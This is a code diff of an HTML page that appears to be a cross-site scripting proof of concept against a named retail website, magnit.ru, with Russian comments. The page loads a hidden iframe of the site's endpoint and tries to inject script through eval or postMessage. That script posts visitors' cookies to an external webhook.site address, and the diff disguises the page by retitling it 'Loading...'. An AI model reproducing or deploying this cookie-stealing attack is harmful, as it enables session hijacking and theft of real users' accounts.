@@ -1,58 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Magnit XSS PoC</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-    <p>Please wait while the exploit is loading...</p>
+    <p>Please wait, loading...</p>
     
-    <!-- Основной скрипт -->
+    <!-- Скрытый iframe для загрузки уязвимой страницы -->
+    <iframe id="target" src="https://magnit.ru/webgate/v2/goods/get" style="width:1px;height:1px;border:none;"></iframe>
+    
     <script>
-        (function() {
-            console.log('🚀 Запуск PoC для magnit.ru');
+        // Ждем загрузки iframe
+        document.getElementById('target').onload = function() {
+            console.log('✅ iframe загружен (goods/get)');
             
-            // Создаем iframe с уязвимым эндпоинтом
-            var iframe = document.createElement('iframe');
-            iframe.src = 'https://magnit.ru/webgate/v2/goods/get';
-            iframe.style.cssText = 'width:1px;height:1px;border:none;position:absolute;left:-9999px;';
-            iframe.id = 'target';
-            document.body.appendChild(iframe);
-            
-            iframe.onload = function() {
-                console.log('✅ iframe загружен');
+            try {
+                // Получаем доступ к iframe
+                var iframeWindow = document.getElementById('target').contentWindow;
                 
+                // Если это тот же домен, можно выполнить код напрямую
+                // Внедряем скрипт, который отправит cookies на webhook
+                var script = `
+                    // Отправляем cookies на webhook
+                    fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'text/plain'},
+                        body: document.cookie
+                    });
+                `;
+                
+                // Выполняем скрипт в контексте iframe
+                iframeWindow.eval(script);
+                console.log('✅ Скрипт внедрен через eval');
+                
+            } catch(e) {
+                console.log('❌ Ошибка при внедрении через eval:', e.message);
+                
+                // Если eval не работает, пробуем через postMessage
                 try {
-                    var win = iframe.contentWindow;
-                    
-                    // Пробуем внедрить скрипт через eval
-                    win.eval(`
-                        console.log('🔥 XSS выполняется внутри iframe');
-                        // Отправляем cookies на webhook
-                        fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'text/plain'},
-                            body: document.cookie
-                        });
-                    `);
-                    console.log('✅ Скрипт выполнен через eval');
-                } catch(e) {
-                    console.log('❌ eval не сработал:', e.message);
-                    
-                    // Если eval не работает, отправляем postMessage
-                    try {
-                        iframe.contentWindow.postMessage(
-                            'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})',
-                            'https://magnit.ru'
-                        );
-                        console.log('✅ postMessage отправлен');
-                    } catch(e2) {
-                        console.log('❌ postMessage не сработал:', e2.message);
-                    }
+                    var iframeWindow = document.getElementById('target').contentWindow;
+                    iframeWindow.postMessage({
+                        type: 'execute',
+                        code: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
+                    }, 'https://magnit.ru');
+                    console.log('✅ postMessage отправлен');
+                } catch(e2) {
+                    console.log('❌ Ошибка при postMessage:', e2.message);
                 }
-            };
-        })();
+            }
+        };
     </script>
 </body>
 </html>
-
